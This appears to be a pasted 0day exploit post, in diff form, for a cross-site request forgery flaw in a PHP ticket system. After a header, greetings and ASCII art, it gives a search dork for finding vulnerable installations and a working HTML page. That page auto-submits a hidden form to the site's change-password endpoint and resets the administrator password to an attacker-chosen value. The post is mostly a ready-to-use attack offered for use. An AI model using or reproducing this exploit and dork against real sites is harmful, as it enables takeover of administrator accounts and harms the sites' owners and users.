@@ -1,0 +1,86 @@
+   1.
+   #########################################################################
+   2.
+   3. [+] Exploit Title : php ticket system csrf
+   4. [+] Author : Pablo '7days' Riberio
+   5. [+] Team: So Good Security
+   6. [+] Other 0days : http://pastebin.com/u/7days
+   7. [+] Version : <= BETA 1
+   8. [+] Tested on : windows/internet explorer
+   9. [+] Details: Reset admin password via CSRF
+   10. [+] Vendor: http://sourceforge.net/projects/phpticketsystem/
+   11. [+] Duck : inurl:ticket/?p=process_change_password&id=1
+   12.
+   #########################################################################
+   13.
+   14.
+   -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+   15. Gr33tz: Greg, Sonya from Mortal Kombat, the owner of the japanese
+   steak creation factory,
+   16. my home boy linus, all the cockneys and my grandma <3
+   17.
+   -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+   18. no thnx 2: microsoft, windoz, estate agents and recruiters
+   19.
+   -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+   20.                       `..`.:::.`
+   21.                      .://o:::///:.
+   22.                     `::+y+::::::/+/`
+   23.                      :/++/::/:/--:+o:`
+   24.                      `://:-:/-/:.-:/oo.
+   25.                       `/-.-:::/o---::+o.
+   26.                        ....-:/+hs::--:+o
+   27.                         .``-//ohh+----:+.
+   28.                        `.``-/+syhs:----/+`
+   29.                       .-.`.-:+syyo:--.-:+/
+   30.                     `---.`.-/+yo/:-----:+o.
+   31.                    .::-...-:+/o/-.-----:+so`
+   32.                  .-::-...-:::::-----:://osy:
+   33.                 .::-....--:::----::/+ooosys-
+   34.                `:--.....-:/:::::/+osyyyyo:`
+   35. `             `----...--:/++++oosyyhhy+-`
+   36. :::::-------:::---..--:/+oossyyhhhhs/.
+   37. ::::::-------:--.-.--:+osyyyhhhhho-`
+   38. ------------.....--:/+oyyhhhhhy+.
+   39. -----------...---:/+osyhhhhyo:`
+   40. :::::-------:::/+osyyhhhhs/.
+   41. ++++++++++++oossyyhhhhs/.
+   42. sssssssyyyyhhhhhhhyo:.`
+   43.         ``..---..`
+   44.
+   45.                           portuguese cyber army
+   46.
+   -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+   47. [+] Begin 0day
+   48.
+   -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+   49.
+   50. <html>
+   51. <head>
+   52. </head>
+   53.   <body>
+   54. <!--  php ticket  -->
+   55.     <form action="
+   http://www.victim.com/ticket/?p=process_change_password&id=1"
+   method="POST" id="csrf" name="csrf" onload="go()">
+   56.       <input type="hidden" name="new_password" value="12351235"
+   />
+   57.       <input type="hidden" name="confirm_password"
+   value="12351235" />
+   58.       <input type="hidden" name="submit" value="Change Password"
+   />
+   59.       <input type="submit" value="Submit form" />
+   60.     </form>
+   61.     </form>
+   62. <script language="JavaScript" type="text/javascript">
+   63. document.csrf.submit();
+   64. </script>
+   65.   </body>
+   66.
+   67. </html>
+   68.
+   69.
+   -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+   70. [+] End 0day
+   71.
+   -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
